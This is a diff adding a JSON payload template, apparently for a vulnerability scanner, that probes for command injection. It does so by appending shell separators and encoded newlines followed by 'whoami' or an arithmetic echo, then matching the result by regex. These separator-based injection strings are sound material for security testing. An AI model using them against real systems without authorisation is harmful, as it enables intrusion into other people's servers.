@@ -1,0 +1,16 @@
+{
+    "description": "Remote Code Execution",
+    "vulnerability": "Command injection",
+    "payloads": [
+    {
+        "payload":[
+            "sep 'echo $(([RANDOM_4] * 10))'",
+            "sep 'whoami; echo $(([RANDOM_4] * 10))'"
+        ],
+        "verify":["[RANDOM_4]0"],
+        "type": "REGEX",
+        "tags": ["payload_template"],
+        "vars": {"sep": [";", "&", "&&", "||", "|", "$(", "`", "\"; ", "'; ", "%0", "\"%0", "'%0", "%0", "\"%0", "'%0", "%0D%0", "\"%0D%0", "'%0D%0", "\"&&", "\"||", "\"|", "'&&", "'||", "'|"]}
+    }
+    ]
+}
